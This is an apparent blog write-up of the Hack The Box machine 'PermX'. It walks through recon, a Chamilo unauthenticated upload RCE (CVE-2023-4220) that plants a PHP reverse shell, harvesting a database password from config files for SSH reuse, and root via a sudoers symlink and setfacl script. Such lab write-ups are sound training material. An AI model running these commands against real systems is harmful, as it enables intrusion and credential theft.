@@ -1,0 +1,332 @@
+---
+title: PermX writeup
+date: 2022-05-21 12:00:00 -500
+categories: [writeups, hackthebox]
+tags: [linux,rce,hacking,writeups]     # TAG names should always be lowercase
+---
+# Initial Reconnaissance: Nmap Scan
+
+Before running any scans, I like to store the target machine's IP address in a file:
+
+```bash
+$ echo "10.129.195.217" >> ip
+```
+
+This way, I can easily retrieve the IP whenever needed using `$(cat ip)`.
+
+**Let's run the Nmap scan:**
+
+```bash
+$ sudo nmap -sS -sV -sC -p- $(cat ip) -oN nmap/permx.out
+```
+
+### Breakdown of the command
+- **`-sS`**: TCP SYN scan (half-open scan).
+- **`-sV`**: Enable version detection.
+- **`-sC`**: Run default Nmap scripts.
+- **`-p-`**: Scan all 65535 ports.
+- **`$(cat ip)`**: Retrieve the target IP address from the `ip` file.
+- **`-oN nmap/permx.out`**: Output results to `nmap/permx.out` in normal format.
+### Results
+```bash
+# Nmap 7.94SVN scan initiated Sun Jul 14 19:59:04 2024 as: nmap -sS -sV -sC -oA nmap/PermX 10.129.195.217
+Nmap scan report for 10.129.195.217
+Host is up (0.016s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
+|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://permx.htb
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jul 14 19:59:11 2024 -- 1 IP address (1 host up) scanned in 7.21 seconds
+```
+
+The results for the scan show two ports open:
+- **`22/tcp ssh`**
+- **`80/tcp http`**
+
+This helps us narrow down the attack surface to the web services and SSH. Considering I don't have access to the SSH backdoor planted by the NSA, we need to try and get into this machine through the webserver.
+
+```bash
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://permx.htb
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+we can see that in order to access the webpage, we need  to add permx.htb to /etc/hosts. 
+```bash
+$ sudo su
+$ echo "$(cat ip)   permx.htb" >> /etc/hosts
+```
+Testing the domain:
+```bash
+$ ping permx.htb -c 3
+PING permx.htb (10.129.195.217) 56(84) bytes of data.
+64 bytes from permx.htb (10.129.195.217): icmp_seq=1 ttl=63 time=8.57 ms
+64 bytes from permx.htb (10.129.195.217): icmp_seq=2 ttl=63 time=8.48 ms
+64 bytes from permx.htb (10.129.195.217): icmp_seq=3 ttl=63 time=8.88 ms
+
+--- permx.htb ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 8.475/8.641/8.884/0.175 ms
+```
+# Directory and Subdomain Enumeration
+After checking the webpage with my browser and finding little of interest, we will enumerate the website's directories to ensure we aren't missing anything important.
+
+```bash
+$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://permx.htb -o gobuster.out
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://permx.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
+/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
+/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
+/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
+/server-status        (Status: 403) [Size: 274]
+Progress: 220560 / 220561 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+Unfortunately, Gobuster didn't yield much useful information, so we'll proceed with subdomain enumeration using FFuF. I find FFuF to be quite elegant and prefer to use it, although similar results could be achieved with Gobuster.
+
+```bash
+$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18 -o ffuf-subdomain.out
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://permx.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.permx.htb
+ :: Output file      : ffuf-subdomain.out
+ :: File format      : json
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 18
+________________________________________________
+
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 491ms]
+www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1674ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 71 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+```
+The subdomain enumeration revealed two subdomains:
+
+- `lms.permx.htb`
+- `www.permx.htb`
+
+This provides us with additional potential entry points to explore.
+
+## Chamilo on LMS.permx.htb
+Visiting `lms.permx.htb` leads us to a Chamilo login portal. Despite enumerating the website further and finding many listed directories, I couldn't locate any version numbers for Chamilo. 
+
+Ultimately, I Googled **Chamilo Exploit** and discovered a variety of Remote Code Execution (RCE) exploits related to a recent Chamilo vulnerability under **CVE-2023-4220**.
+
+I settled for [this](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) exploit by m3m0o and you can read about how to manually exploit this vulnerability [here](https://github.com/dollarboysushil/Chamilo-LMS-Unauthenticated-File-Upload-CVE-2023-4220). In this blog, I won't cover the automated exploit in detail as it is straightforward.
+# Successfully Establishing a Connection
+## Manual exploitation
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+Update the IP and port number in the file and upload it to the target using the command below.
+
+```bash
+$ curl -F 'bigUploadFile=@reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+The file has successfully been uploaded
+```
+
+### Setting up listener with Penelope.py
+I've been experimenting with Penelope after discovering it in a LinkedIn post. I find it very useful as it automatically upgrades my shell, which simplifies my work.
+```bash
+$ python /opt/penelope/penelope.py 
+[+] Listening for reverse shells on 0.0.0.0 🚪4444 
+➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+### Triggering the exploit
+To trigger the exploit, navigate to:
+`http://<website>/main/inc/lib/javascript/bigupload/files/ `
+and open the `.php` file you just uploaded.
+```bash
+[+] Got reverse shell from 🐧 permx.htb~10.129.195.217 💀 - Assigned SessionID <1>
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/bbzrta/.penelope/permx.htb~10.129.195.217/permx.htb~10.129.195.217.log 📜
+www-data@permx:/$ 
+```
+
+# User flag
+when the shell spawns, you can see that you are logged in as www-data, 
+lets have a look at `/var/www/chamilo` as this is where the learning platform is located. 
+
+As I have done boxes like this before, i know that the chances of us finding the right credentials on the box is very high. usually there is a pair of credentials that is used for database configuration, or sometimes the user's credentials are stored with a breakable hash or even clear case. so i need to comb through  all of these files and see if my eye catches anything. 
+
+There are three ways we can do this:
+1. **Manually going through the readable files**:
+    - Open and inspect each file for potential credentials.
+2. **Using grep to search for the word "password"**: 
+	- `grep -arin -o -E '(\w+\w){0,5}password(\W+\w){0,5}' . `
+	
+3. **Using an automation script like [PEASS-ng](https://github.com/peass-ng/PEASS-ng)**
+	- Download and run the PEASS-ng script to automate the search for credentials and other useful information.
+## Manually going through the readable files
+While inspecting the configuration files for Chamilo, we come across `cli-config.php`. Upon further investigation, we see it tries to pull credentials from another file.
+
+```php
+$database = new \Database();
+$dbParams = [
+    'driver' => 'pdo_mysql',
+    'host' => $_configuration['db_host'],
+    'user' => $_configuration['db_user'],
+    'password' => $_configuration['db_password'],
+    'dbname' => $_configuration['main_database'],
+];
+```
+It appears these values are sourced from `./app/config/configuration.php`, as evidenced by the following lines of code:
+```php
+$configurationFile = __DIR__.'/app/config/configuration.php';
+
+if (!is_file($configurationFile)) {
+    echo "File does not exists: $configurationFile";
+    exit();
+}
+```
+
+Upon examining `./app/config/configuration.php`, we quickly locate the `db_user` and `db_password`:
+
+```php
+// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;
+```
+With these credentials, we can potentially access the Chamilo database and further our exploitation efforts.
+## Attempting to Access the Database
+Upon attempting to connect to MySQL, we quickly encounter an "Access Denied" error for the `www-data` user, indicating that this user does not have the necessary permissions. 
+```bash
+www-data@permx:~/chamilo$ mysql
+ERROR 1698 (28000): Access denied for user 'www-data'@'localhost'
+```
+
+## Checking for Other Users
+By reviewing the `/etc/passwd` file, we notice another user present on the system named `mtz`.
+```bash
+www-data@permx:~/chamilo$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+```
+
+## Attempting SSH with Found Credentials
+Let's try to SSH into the `mtz` account using the password we discovered in the Chamilo configuration file.
+```bash
+$ ssh mtz@permx.htb
+The authenticity of host 'permx.htb (10.129.195.240)' can't be established.
+ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'permx.htb' (ED25519) to the list of known hosts.
+mtz@permx.htb's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
+mtz@permx:~$ 
+```
+Now that we have successfully logged in as the `mtz` user, we can proceed to grab the user flag.
+
+```bash
+mtz@permx:~$ ls
+user.txt
+```
+With access to the `mtz` account, we have successfully moved further into the system.
+# Privilege Escalation 
+
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
+
+```bash
+mtz@permx:~$ cat /opt/acl.sh 
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+```
+# Root Flag
+
+```bash
+mtz@permx:~$ ln -s /etc/sudoers helpfile
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/helpfile 
+mtz@permx:~$ vim helpfile 
+mtz@permx:~$ sudo su
+[sudo] password for mtz: 
+root@permx:/home/mtz# 
+```
+
+```bash
+root@permx:/home/mtz# cd
+root@permx:~# ls
+backup  reset.sh  root.txt
+root@permx:~# 
+```
